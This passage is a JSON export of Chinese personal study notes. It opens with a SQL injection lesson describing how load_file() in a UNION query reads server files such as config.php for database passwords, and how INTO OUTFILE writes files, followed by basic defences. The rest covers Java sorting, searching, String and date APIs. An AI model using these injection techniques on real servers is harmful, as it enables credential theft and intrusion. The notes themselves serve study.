读取文件\n\n使用函数：`load_file()`\n\n后面的路径可以是单引号，0x，char转换的字符。\n\n注意：路径中斜杠是/不是\\。\n\n一般可以与union中做为一个字段使用，查看config.php(即mysql的密码)，apache配置...\n#### 写入文件\n\n使用函数：`Into Outfile`（能写入多行，按格式输出）和 `into Dumpfile`（只能写入一行且没有输出格式）\n\noutfile 后面不能接0x开头或者char转换以后的路径，只能是单引号路径\n# 2.6 SQL注入之基础防御\n### 魔术引号\n\n魔术引号（Magic Quote）是一个自动将进入 PHP 脚本的数据进行转义的过程。\n最好在编码时不要转义而在运行时根据需要而转义。\n\n魔术引号：\n在php.ini文件内找到\n\n```\nmagic_quotes_gpc = On 开启\n\n将其改为\n\nmagic_quotes_gpc = Off 关闭\n```\n### 内置函数\n\n做数据类型的过滤\n\nis_int()等\n\naddslashes()\n\nmysql_real_escape_string()\n\nmysql_escape_string()\n### 自定义关键字\n\nstr_replace()\n\n其他安全防护软件 WAF ......","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/201_%E6%8E%92%E5%BA%8F%E4%B8%8E%E6%9F%A5%E6%89%BE":{"title":"201_排序与查找","content":"# 201_排序与查找\n\n## 排序的内置方法java.util.Arrays\neg\n```java\njava.util.Arrays(数组名);\n```\noutput\n\t![[../../../../assets/Pasted image 20220720101424.png]]\n\n## [[202.冒泡排序方法]]\n## [[203.选择排序]]\n## [[204.顺序查找]]\n## [[205.二分查找]]\n## [[207.数组工具类java.util.Arrays]]","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/202_%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E6%96%B9%E6%B3%95":{"title":"202_冒泡排序方法","content":"# 202_冒泡排序方法\n\u003e[!tip]+ 讲解\n\u003e1. 从第一个开始，依次向右比较，左边比右边的数大，就交换两个数字\n\u003e2. 第一轮可以把最大的数字放到最左边，第二轮依次\n\u003e![冒泡](https://www.runoob.com/wp-content/uploads/2019/03/bubbleSort.gif)\n\n```java\npublic class Test02 {  \n    public static void main(String[] args) {  \n        int[] b={1,54,6,7,6,464,78,12,46};  \n        int[] c=sorta(b);  \n        for (int i = 0; i \u003c c.length ; i++) {  \n            System.out.println(c[i]);  \n        }  \n  \n    }  \n    //冒泡排序 方法  \n    public static int[] sorta(int[] a){  \n        for (int i = a.length-1; i \u003e0 ; i--) {  \n            for (int j = 0; j \u003ci; j++) {  \n                if (a[j]\u003ea[j+1]){  \n                    //如果前一个大于后一个，就互换位置  \n                    int tmp=a[j];  \n                    a[j]=a[j+1];  \n                    a[j+1]=tmp;  \n                }  \n            }  \n        }  \n        return a;  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220720192154.png]]\n\n\n","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/203_%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F":{"title":"203_选择排序","content":"# 203_选择排序\n\u003e[!tip]+ 讲解\n\u003e假设第一个数字为最小的数min，然后依次在这个数字后面找更小的数\n\u003e如果找到了就记录最小数的下标，然后再把这个数与参与排序的第一个数相互交换\n\u003e再假设第二个数为最小的数，在其后找最小的数交换\n\u003e注意：与冒泡排序循环次数一样，都是(n-1)?   阶加次\n\u003e时间复杂度： O(n²)\n演示\n![](https://www.runoob.com/wp-content/uploads/2019/03/selectionSort.gif)\n```java\npublic class Test03 {  \n  \n    public static void main(String[] args) {  \n        int[] c=sorta(new int[]{2,3,38,5,47,15,36,26,27,44,46,38,47,50,48});  \n        for (int i = 0; i \u003c c.length ; i++) {  \n            System.out.print(c[i]+\" \");  \n        }  \n    }  \n    public static int[] sorta(int[] a){  \n        //每次找出最小的那个数  \n        for (int i = 0; i \u003ca.length-1; i++) {  \n            int min=i;//假设每次最小的那个数是参与排序最前面的那个数，i是那个数的下标  \n            for (int j =i+1; j \u003ca.length; j++) {  \n                if (a[min]\u003ea[j]){  \n                    min=j;//如果能在其中找到更小的就记录下他的下标  \n                }  \n            }  \n            //如果这个最小的数不在参与排序的最前面，就和那个最前面的数交换  \n            if (min!=i){  \n                int tmp=a[i];  \n                a[i]=a[min];  \n                a[min]=tmp;  \n            }  \n  \n        }  \n        return a;  \n    }  \n  \n  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220720210200.png]]\n\n","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/204_%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE":{"title":"204_顺序查找","content":"# 204_顺序查找\n```java\npublic class SearchTest01 {  \n    public static void main(String[] args) {  \n        int[] arr={1,5,45,5,64,8};  \n/*        for (int i = 0; i \u003carr.length ; i++) {  \n            if (arr[i]==64){                System.out.println(\"64的下标是\"+i);  \n                return;            }        }        //程序能够走到这儿，说明没有找到64  \n        System.out.println(\"没找到\");*/  \n  \n    //    对以上封装一个方法  \n        int arrIndex=arraySearch(arr,5);  \n        System.out.println(arrIndex==-1?\"该元素不存在\":\"该元素的下标是\"+arrIndex);  \n  \n    }  \n  \n    /**  \n     *从数组中检索某个元素的下标  \n     * @param arr 被检索的数组  \n     * @param ele  被检索的元素  \n     * @return   返回的数值表示元素在数组中的下标,如果为-1表示不存在  \n     */  \n    public static int arraySearch(int[] arr, int ele) {  \n        for (int i = 0; i \u003carr.length ; i++) {  \n            if(ele==arr[i]){  \n                return i;    //返回下标  \n            }  \n        }  \n        return -1;//如果没找到就返回-1  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220722165403.png]]","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/205_%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE":{"title":"205_二分查找","content":"# 205_二分查找\n必要条件:**必须要在排序的基础上  **\n![](https://www.runoob.com/wp-content/uploads/2019/05/Binary_search_into_array.png)\n\n\n```java\npublic class ArraySearch02 {  \n    public static void main(String[] args) {  \n        int[] arr={1,45,56,78,89,455,1254,4546};  \n        int index=arrBinSearch(arr,78);  \n        System.out.println(index==-1?\"该元素不存在\":\"该元素的下标是\"+index);  \n        index=arrBinSearch(arr,1);  \n        System.out.println(index==-1?\"该元素不存在\":\"该元素的下标是\"+index);  \n    }  \n  \n    public static int arrBinSearch(int[] arr, int ele) {  \n    //    定义大数,小数,中间数的下标  \n        int first=0;  \n        int last=arr.length-1;  \n        int mid=0;  \n  \n        //当小数等于小于后面的大数才运行  \n        while (first\u003c=last){  \n            mid=(last+first)/2;  \n  \n            if (ele\u003earr[mid]){               //如果查找的元素大于中间数,那么就first就调整为mid的下一个元素,在右半区域继续二半查找  \n                first=mid+1;  \n            } else if (ele\u003carr[mid]) {          //如果查找的元素小于中间数,那么就last就调整为mid的下上个元素,在左半区域继续二半查找  \n                last=mid-1;  \n            } else {                //如果刚好相等,就直接返回下标  \n                return mid;  \n            }  \n        }  \n  \n        return -1;  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220722174209.png]]","lastmodified":"2023-05-31T09:03:32.965907089Z","tags":null},"/207_%E6%95%B0%E7%BB%84%E5%B7%A5%E5%85%B7%E7%B1%BBjava_util_Arrays":{"title":"207_数组工具类java_util_Arrays","content":"# 207_数组工具类java_util_Arrays\n\n\neg\n```java\nimport java.util.Arrays;  \n  \npublic class ArrayTest04 {  \n    public static void main(String[] args) {  \n        int[] arr={1,45,6,45,44,56,68,165,45,4,14,61,64,98};  \n    //    使用arrays工具类对其进行排序  \n        Arrays.sort(arr);  \n    //    对排序后的数组进行输出  \n        for (int i = 0; i \u003carr.length ; i++) {  \n            System.out.print(arr[i]+\" \");  \n        }  \n  \n    //    使用arrays工具类进行二分查找  \n        int index=Arrays.binarySearch(arr,45);  \n        System.out.println(index==-1?\"该元素不存在\":\"该元素的下标为\"+index);  \n    }  \n}\n```\n\n\u003e[!tip]+ 其他\n\u003e可以看到,[[205.二分查找|二分查找]]的方法相比顺序查找除了查找效率和查找条件(必须是排序好的序列)不同之外,查找到的元素如果有多个一样的值,那么可能查找的不是第一个元素的下标","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2111_String%E7%B1%BB":{"title":"2111_String类","content":"# 2111_String类\n# String基本\n\n\u003e[!tip]+ 关于Java JDK中内置的一个类：`java.lang.String`\n\u003e1. String表示**字符串**，属于**引用数据类型**，不属于基本数据类型。\n\u003e2. 在java中随便使用双引号括起来的都是String对象。例如：\"abc\"，\"def\"，\"hello world!\"，这是3个String对象。\n\u003e3. java中规定，双引号括起来的字符串，是不可变的，也就是说\"abc\"自出生到最终死亡，不可变，不能变成\"abcd\"，也不能变成\"ab\"\n\u003e4. **在JDK当中双引号括起来的字符串**，例如：\"abc\" \"def\"都是**直接存储在“方法区”的“字符串常量池”当中**的。因为这些字符串需要频繁的进行使用,**垃圾回收器是不会回收常量的**\n\u003e5. 不管是直接用双引号定义的字符串变量,还是new出来的字符串,双引号字符串都是存储在方法区中的常量池的,new出来的,会在堆中存放一个指向这个常量池的内存地址\n\n## eg1\n\n```java\npublic class StringTest01 {\n    public static void main(String[] args) {\n        // 这两行代码表示底层创建了3个字符串对象，都在字符串常量池当中。\n        String s1 = \"abcdef\";\n        String s2 = \"abcdef\" + \"xy\";\n\n        // 分析：这是使用new的方式创建的字符串对象。这个代码中的\"xy\"是从哪里来的？\n        // 凡是双引号括起来的都在字符串常量池中有一份。\n        // new对象的时候一定在堆内存当中开辟空间。\n        String s3 = new String(\"xy\");\n\n        // i变量中保存的是100这个值。\n        int i = 100;\n        // s变量中保存的是字符串对象的内存地址。\n        // s引用中保存的不是\"abc\"，是0x1111\n        // 而0x1111是\"abc\"字符串对象在“字符串常量池”当中的内存地址。\n        String s = \"abc\";\n    }\n}\n```\n\n ![[../assets/4f891fc172f84f76baa45d44cb3ff03d.png]]\n 如上图,s3保存的不是字符串\"xy\",保存的是\"xy\"字符串的内存地址,\"xy保存在方法区中的常量池当中\"\n## String的比较\n因为new对象的所保存的内存地址可能不同,采用\\=\\=比较的并不是直接比较的其字面量的地址,所以可能出错\n**建议采用equals的方法去对String类型字符串或者对象进行比较**\n**因为字符串对象的equals是已经被重写过,不用再写**\n```java\npublic class StringTest02 {\n    public static void main(String[] args) {\n        String s1 = \"hello\";\n        // \"hello\"是存储在方法区的字符串常量池当中\n        // 所以这个\"hello\"不会新建。（因为这个对象已经存在了！）\n        String s2 = \"hello\";\n        // 分析结果是true还是false？\n        // == 双等号比较的是不是变量中保存的内存地址？是的。\n        System.out.println(s1 == s2); // true\n\n        String x = new String(\"xyz\");\n        String y = new String(\"xyz\");\n        // 分析结果是true还是false？\n        // == 双等号比较的是不是变量中保存的内存地址？是的。\n        System.out.println(x == y); //false\n\n        // 通过这个案例的学习，我们知道了，字符串对象之间的比较不能使用“==”\n        // \"==\"不保险。应该调用String类的equals方法。\n        // String类已经重写了equals方法，以下的equals方法调用的是String重写之后的equals方法。\n        System.out.println(x.equals(y)); // true\n\n        String k = new String(\"testString\");\n        //String k = null;\n        // \"testString\"这个字符串可以后面加\".\"呢？\n        // 因为\"testString\"是一个String字符串对象。只要是对象都能调用方法。\n        System.out.println(\"testString\".equals(k)); // 建议使用这种方式，因为这个可以避免空指针异常。\n        System.out.println(k.equals(\"testString\")); // 存在空指针异常的风险。不建议这样写。\n    }\n}\n\n```\n\noutput\n```cmd\ntrue\nfalse\ntrue\n```\n\n# String常用构造方法\nhttps://www.matools.com/file/manual/jdk_api_1.8_google/java/lang/String.html\n```java\npublic class Test02 {  \n    public static void main(String[] args) {  \n    //    最常用的构造方法  \n        String s=\"最常用的常用方法\";  \n        System.out.println(s);  \n    //    第二种  \n        String s2=new String(\"第二种方法\");  \n        System.out.println(s2);  \n    //    第三种  \n        char[] c1={'我','是','中','国','人'};  \n        String s3=new String(c1);  \n        System.out.println(s3);  \n        String s33=new String(c1,2,3);//在char数组中,第二个开始,抽取三个元素  \n    //    第四种  \n        byte[] b4= {97,98,99,100};  \n        String s4=new String(b4);  \n        System.out.println(s4);  \n        String s44=new String(b4,0,3);  \n        System.out.println(s44);  \n  \n  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220722204855.png]]\n\n ","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2112_String%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95":{"title":"2112_String常用方法","content":"# 2112_String常用方法\n```java\n  \npublic class Test03 {  \n    public static void main(String[] args) {  \n        //charAt 返回字符串指定下标的字符  \n        String a=\"我是一个中国人\";  \n        System.out.println(a.charAt(2));  \n        System.out.println(\"===============\");  \n  \n        //compareTo 按照字典进行比较,按位比较,0就相等,正数或者负数表示前面和后面第一个不相同的数字的大小差值,能比出来,后面的就不比较了  \n        System.out.println(\"abc\".compareTo(\"abd\"));  \n        System.out.println(\"abc\".compareTo(\"abb\"));  \n        System.out.println(\"abc\".compareTo(\"cba\"));  \n        System.out.println(\"abc\".compareTo(\"abc\"));  \n        System.out.println(\"abc\".compareTo(\"efz\"));  \n        System.out.println(\"abc\".compareTo(\"a\"));  \n        System.out.println(\"=================\");  \n  \n        //contains(CharSequence s),前面的字符串是否包含后面的字符串  \n        System.out.println(\"我是你爸爸的儿子的大帅比\".contains(\"儿子\"));  \n        System.out.println(\"==============\");  \n  \n        System.out.println(\"endsWith(String suffix) 此字符串是否以指定的后缀结尾。\");  \n        System.out.println(\"我是大帅比\".endsWith(\"大帅比\"));  \n        System.out.println(\"我是蔡徐坤\".endsWith(\"还好吧\"));  \n        System.out.println(\"startsWith(String prefix) 此字符串是否以指定的前缀开始\");  \n        System.out.println(\"javadasklfjkalsfjakok\".startsWith(\"java\"));  \n        System.out.println(\"==================\");  \n  \n        //equals() 和      equalsIgnoreCase(String str)        System.out.println(\"abc\".equals(\"abc\"));  \n        System.out.println(\"abc\".equals(\"abC\"));  \n        System.out.println(\"abc\".  equalsIgnoreCase(\"abC\"));//忽略大小写的比较  \n  \n    //    getBytes()  把字符串对象转换成byte数组  \n        byte[] byte1=\"abc\".getBytes();  \n        System.out.println(byte1[2]);  \n  \n        // indexOf(String str) 返回指定子字符串第一次出现的字符串内的索引。  \n        //lastIndexOf(String str)  最后一次出现的索引  \n        System.out.println(\"凉风不顾归尘仆仆的行者零落了世间所有的风华，我在天涯征程之外寻寻觅觅那一树的花开，冷香随着秋风袭卷了草木荣枯的来去归途。\".indexOf(\"世间所有的风华\"));  \n        System.out.println(\"你是谁,我是谁\".lastIndexOf(\"是谁\"));  \n        // isEmpty() length是否为0,不包括null  \n        System.out.println(\"isEmpty=======\");  \n        System.out.println(\"ab\".isEmpty());  \n        System.out.println(\"\".isEmpty());  \n        String string1=new String();  \n        //string1=null;  //下面会出现空值异常,底层调用的length方法  \n        System.out.println(string1.isEmpty());  \n  \n  \n        //判断字符串长度是length()方法,判断数组长度是length属性  \n        System.out.println(\"hello\".length());  \n  \n        // replace(char oldChar, char newChar) 替换字符串  \n        System.out.println(\"我是大帅比,你是不是?\".replace(\"是\",\"像\"));  \n  \n        //split(String regex)  用字符串分割为数组  \n        String[] sp1=\"帅哥,小姐,美女,野兽,帅比,儿子,孙子,玫瑰,显化\".split(\",\");  \n        for (int i = 0; i \u003csp1.length ; i++) {  \n            System.out.print(sp1[i]+\" \");  \n        }  \n  \n        System.out.println(\"substring(int beginIndex) 返回该字符串指定下标开始的子字符串\");  \n        System.out.println(\"https://www.baidu.com\".substring(5));//下标为5开始的后面字符串,包括5  \n        System.out.println(\"https://www.baidu.com\".substring(4,6));//下标为4开始,下标为6-1结束,左闭右开  \n  \n        System.out.println(\"toCharArray() 将此字符串转换为新的字符数组。\");  \n        char[] chars2=\"我是大帅哥\".toCharArray();  \n        for (int i = 0; i \u003c chars2.length; i++) {  \n            System.out.println(chars2[i]);  \n        }  \n  \n        System.out.println(\"toLowerCase() 转换成小写\");  \n        System.out.println(\"ABdfdsfDDSFS\".toLowerCase());  \n        System.out.println(\"\\ttoUpperCase() 转换成大写\");  \n        System.out.println(\"abcdefgHJ\".toUpperCase());  \n  \n  \n        System.out.println(\"\\ttrim()\\n\" +  \n                \"返回一个字符串，其值为此字符串，并删除任何前导和尾随空格。\");  \n        System.out.println(\"   sjkfjslf  fskjfs  fsjfks\".trim());  \n  \n        System.out.println(\"valueOf(boolean b) 把不是字符串的转换成字符串\");  \n        String s7=String.valueOf(true);  \n        System.out.println(s7);//是字符串，不是boolean类型了  \n        System.out.println(String.valueOf(new Customer()));//当是对象的时候，会调用toString方法  \n    }  \n  \n}  \nclass Customer{  \n    @Override  \n    public String toString() {  \n        return \"我是一个vip客户\";  \n    }  \n}\n```\noutput\n\n```cmd\n\"C:\\Program Files\\Java\\jdk1.8.0_152\\bin\\java.exe\" \"-javaagent:C:\\Program Files\\JetBrains\\IntelliJ IDEA Community Edition 2022.1.3\\lib\\idea_rt.jar=4130:C:\\Program Files\\JetBrains\\IntelliJ IDEA Community Edition 2022.1.3\\bin\" -Dfile.encoding=UTF-8 -classpath \"C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\charsets.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\deploy.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\access-bridge-64.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\cldrdata.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\dnsns.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\jaccess.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\jfxrt.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\localedata.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\nashorn.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\sunec.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\sunjce_provider.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\sunmscapi.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\sunpkcs11.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\ext\\zipfs.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\javaws.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\jce.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\jfr.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\jfxswt.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\jsse.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\management-agent.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\plugin.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\resources.jar;C:\\Program Files\\Java\\jdk1.8.0_152\\jre\\lib\\rt.jar;E:\\javaAdvanced\\out\\production\\stringTest\" Test03\n一\n===============\n-1\n1\n-2\n0\n-4\n2\n=================\ntrue\n==============\nendsWith(String suffix) 此字符串是否以指定的后缀结尾。\ntrue\nfalse\nstartsWith(String prefix) 此字符串是否以指定的前缀开始\ntrue\n==================\ntrue\nfalse\ntrue\n99\n14\n5\nisEmpty=======\nfalse\ntrue\ntrue\n5\n我像大帅比,你像不像?\n帅哥 小姐 美女 野兽 帅比 儿子 孙子 玫瑰 显化 substring(int beginIndex) 返回该字符串指定下标开始的子字符串\n://www.baidu.com\ns:\ntoCharArray() 将此字符串转换为新的字符数组。\n我\n是\n大\n帅\n哥\ntoLowerCase() 转换成小写\nabdfdsfddsfs\n\ttoUpperCase() 转换成大写\nABCDEFGHJ\n\ttrim()\n返回一个字符串，其值为此字符串，并删除任何前导和尾随空格。\nsjkfjslf  fskjfs  fsjfks\nvalueOf(boolean b) 把不是字符串的转换成字符串\ntrue\n我是一个vip客户\n\nProcess finished with exit code 0\n\n```\n\n\u003e[!bug]+ 注意\n\u003e可以发现在java中输出 在控制台上的都是经过了toString方法的","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2113_%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5StringBuffer":{"title":"2113_字符串拼接StringBuffer","content":"# 2113_字符串拼接StringBuffer\n在`java.lang`中\n帮助文档 : https://www.matools.com/file/manual/jdk_api_1.8_google/java/lang/StringBuffer.html\n# 概述\n\u003e[!tip]+ 使用原因\n\u003e1. 使用+号来对字符串拼接,会在方法区常量池中占用大量的内存,造成方法区的压力(每次拼接都会新建一个字符串在常量池中)\n\u003e2. 使用StringBuffer可以创建字符串缓冲区对象,缓解常量池压力\n\u003e3. 默认是创建16byte的数组作为字符串缓冲区对象![[../../../../assets/Pasted image 20220723102153.png]] ![[../../../../assets/Pasted image 20220723102210.png]]\n\n\n\u003e[!tip]+ String和StringBuffer的区别\n\u003e为什么Stirng更加占用常量池,因为在定义String类中,对String添加了`final`关键字,表示其不可变,每次创建都是新创建的一个新的char数组 ![[../../../../assets/Pasted image 20220723102641.png]]\n\u003e1. 在String创建对象`str`时候,因为`final`关键字,所以`String`指向的char[]数组对象内存地址不可在变,而采用+号进行拷贝的时候,无法str指向新的char[]进行拷贝,因为内存地址指定了就不可再变(final),所以需要新开辟一个地址重新存储拼接的字符串\n\u003e2. 而StringBuffer没有`final`修饰,所以可以通过char[]的arrayscopy操作,对数组进行拷贝,然后重新指向这个新的大数组,作为字符串对象,之前的字符串对象就被回收了,所以不占用多个内存地址\n\n\n# 注意\n1. 在使用`StringBuffer`时,**尽量先初始化合适的容量,避免多次扩容**\n```java\npublic class StringBufferTest01 {  \n    public static void main(String[] args) {  \n        //创建一个默认16byte的数组 作为字符串缓冲区对象  \n        StringBuffer strbuff1=new StringBuffer();  \n        strbuff1.append(\"abc\");  //拷贝进去  \n        System.out.println(strbuff1);  \n        strbuff1.append(\"efg\");  \n        System.out.println(strbuff1);  \n  \n        //给定一个合适的初始化容量  \n        StringBuffer strBuff2=new StringBuffer(100);  \n        strBuff2.append(1245);  //拼接  \n        System.out.println(strBuff2);  \n        strBuff2.append(\"我是大帅比,你是大沙贝\");  \n        System.out.println(strBuff2);  \n  \n    }  \n}\n```\n\noutput\n![[../../../../assets/Pasted image 20220723103958.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2114_%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5StringBuilder":{"title":"2114_字符串拼接StringBuilder","content":"# 2114_字符串拼接StringBuilder\n帮助文档:[`StringBuilder`](https://www.matools.com/file/manual/jdk_api_1.8_google/java/lang/StringBuilder.html \"java.lang中的类\")\n\n# StringBuilder和[[214.字符串拼接StringBuffer|StringBuffer]]的区别\n\n1. StringBuilder没有`synchronized`关键字修饰,所以在多线程环境下是不安全的,而**[[214.字符串拼接StringBuffer|StringBuffer]]在多线程下是安全的** (StringBuilder非线程安全,StringBuffer线程安全)\n\n```java\npublic class StringBuilderTest01 {  \n    public static void main(String[] args) {  \n        StringBuilder s1=new StringBuilder(100);//初始化容量  \n        s1.append(\"abc\");  \n        System.out.println(s1);  \n        s1.append(123132);  \n        System.out.println(s1);  \n    }  \n}\n```\n\noutput\n```cmd\nabc\nabc123132\n```\n\n\u003e[!tip]+ 面试问题:为什么String是不可变的?\n\u003e\t因为源代码String中有一个char[]数组,一旦指定长度之后,长度就是不可改变的,并且用`final`修饰,指向的内存地址也就不可以指向其他对象了\n\n\n## Integer常量池\n```java\npublic class IntegerTest06 {\n    public static void main(String[] args) {\n\n        Integer a = 128;\n        Integer b = 128;\n        System.out.println(a == b); //false\n\n        /*\n        java中为了提高程序的执行效率，将[-128到127]之间所有的包装对象提前创建好，\n        放到了一个方法区的“整数型常量池”当中了，目的是只要用这个区间的数据不需要\n        再new了，直接从整数型常量池当中取出来。\n\n        原理：x变量中保存的对象的内存地址和y变量中保存的对象的内存地址是一样的。\n         */\n        Integer x = 127;\n        Integer y = 127;\n        // == 永远判断的都是两个对象的内存地址是否相同。\n        System.out.println(x == y); //true\n    }\n}\n```\n\u003e[!tip]+ 面试问题:为什么`Integer`以上的两个变量中,比较的结果不一样\n\u003e1. 因为`Integer`类加载的时候,会初始化整型的256个常量放到常量池中\n\u003e2.   java中为了提高程序的执行效率，将[-128到127]之间所有的包装对象提前创建好，放到了方法区的“整数型常量池”当中了，目的是只要用这个区间的数据不需要再new了，直接从整数型常量池当中取出来。\n\u003e3. 所以再下面的`x`和`y`变量中比较的直接就是比较的127的内存地址,而不是xy变量的内存地址了\n    \n![[../../../../assets/Pasted image 20220723155717.png]]\n\n","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2115_%E5%85%AB%E7%A7%8D%E5%8C%85%E8%A3%85%E7%B1%BB%E5%9E%8BInteger%E7%AD%89%E7%AD%89":{"title":"2115_八种包装类型Integer等等","content":"包: `java.long`\n\n\u003e[!tip]+ 八种包装类型存在的意义\n\u003e1. 因为8种基本数据类型不够用。所以SUN又提供对应的8种包装类型。\n\u003e2. **在调用方法等等时候,传入的参数如果是对象,那么基本数据类型不满足条件的时候,就可以传入包装类型就好了**\n\u003e3. **基本数据类型向引用数据类型的转换**\n\n## 对照\n\n| 基本数据类型 | 包装类型  父类                |\n| ------------ | ----------------------------- |\n| byte         | `java.lang.Byte` 父类Number   |\n| short        | `java.lang.Short`      Number |\n| int          | `java.lang.Integer` Number    |\n| long         | `java.lang.Long ` Number      |\n| float        | `java.lang.Float` Number      |\n| double       | `java.lang.Double` Number     |\n| boolean      | `java.lang.Boolean` Object    |\n| char         | `java.lang.Character` Objcet  |\n\n## 定义与转换\n手动装箱和拆箱:\n```java\npublic class Test01 {  \n    public static void main(String[] args) {  \n        //定义包装类型的整数  \n        //基本数据类型--\u003e包装数据类型  \n        Integer i=new Integer(123);  \n        //包装类型--\u003e基本数据类型的转换  \n        int i1=i.intValue();  \n        float f1=i.floatValue();  \n  \n        System.out.println(f1);  \n        System.out.println(i);  \n    }  \n}\n```\nouput\n![[../../../../assets/Pasted image 20220723151806.png]]\n\n**jdk1.5之后支持自动装箱和自动拆箱**\n说白了,**装箱**就是**不用再new**那一下,把参数放进括号里了;**拆箱**就不用xxxValue()再进行赋值了\n```java\npublic class Test02 {  \n    public static void main(String[] args) {  \n        //自动装箱  \n        Integer i1=123;  \n        //自动拆箱  \n        double i2=i1;  \n        //自动装箱  \n        Character c1='c';  \n        float f1=1.115f;  \n        System.out.println(f1);  \n        //自动装箱  \n        Float f2=f1;  \n        System.out.println(f2);  \n  \n  \n        System.out.println(i1);  \n        System.out.println(c1);  \n  \n    }  \n}\n```\noutput\n![[../../../../assets/Pasted image 20220723152726.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2116_String_int_Integer%E4%B9%8B%E9%97%B4%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2":{"title":"2116_String_int_Integer之间的相互转换","content":"# 2116_String_int_Integer之间的相互转换\n![[../assets/7d832e5816d04e45b9b398ef72c9db4b.png]]\n\n```java\npublic class Test04 {  \n    public static void main(String[] args) {  \n        //String --\u003e int  \n        String s1=\"123\";  \n        int i1=Integer.parseInt(s1);  \n        System.out.println(i1+1);//124  \n  \n        //int --\u003e String        int i2=12;  \n        String s2=String.valueOf(i2);  \n        System.out.println(s2+45);//'1245'  \n  \n        //int --\u003eInteger  自动装箱  \n        Integer i3=45;//45  \n        //Integer --\u003e int 自动拆箱  \n        int i33=i3;//45  \n  \n        //String --\u003eInteger        Integer s4=Integer.valueOf(i3); //45  \n        System.out.println(i3+96);//141  \n  \n        //Integer --\u003eString        String s5=s4.toString();//'45'  \n        System.out.println(s5+45);//'4545'  \n  \n    }  \n}\n```\n\noutput\n![[../../../../assets/Pasted image 20220723163151.png]]","lastmodified":"2023-05-31T09:03:32.969907125Z","tags":null},"/2121_java%E5%AF%B9%E6%97%A5%E6%9C%9F%E7%9A%84%E5%A4%84%E7%90%86":{"title":"2121_java对日期的处理","content":"# 2121_java对日期的处理\n# 获取时间以及时间相互转换\n包名:`-   java.util.Date`\n帮助文档:https://www.matools.com/file/manual/jdk_api_1.8_google/java/util/Date.html\n\n日期格式化`SimpleDateFormat`帮助文档:https://www.matools.com/file/manual/jdk_api_1.8_google/java/text/SimpleDateFormat.html\n1. 获取当前时间\n2. 对时间进行格式化输出\n3. 文本转换成Date格式\n```java\nimport java.text.SimpleDateFormat;  \nimport java.util.Date;  \n  \npublic class Test01  {  \n    public static void main(String[] args) throws Exception{  \n        //获取当前时间,采用无参构造对象  \n        Date nowTime=new Date();  \n        System.out.println(nowTime);//Sat Jul 23 16:43:44 CST 2022  \n  \n        //日期格式化 然后输出  \n        //SimpleDateFormat  \n        SimpleDateFormat sdf1=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss SS\");  \n        String nowTimestr=sdf1.format(nowTime);  \n        System.out.println(nowTimestr); //2022-07-23 16:53:53 663  \n  \n        //String --\u003eDate类型  \n        String time1=\"2022-01-23 16:53:45 663\";  \n        SimpleDateFormat sdf2=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss SS\");//必须要与转换的格式相互对应,不然会报错,在main方法上面添加throws Exception  \n        Date d2=sdf2.parse(time1);  \n        System.out.println(d2);//Sun Jan 23 16:53:45 CST 2022  \n  \n    }  \n}\n```\n\noutput\n![[../../../../assets/Pasted image 20220723170216.png]]\n\n# 获取毫秒级时间戳\n1. 获取时间戳\n2. 使用时间戳记录方法使用的时间\n```java\n  \n  \npublic class Test02 {  \n    public static void main(String[] args) {  \n        //获取1970-1-1到当前时间的 毫秒级 时间戳  \n         long nowTimeMillis=System.currentTimeMillis();  \n        System.out.println(nowTimeMillis); //1658567135832  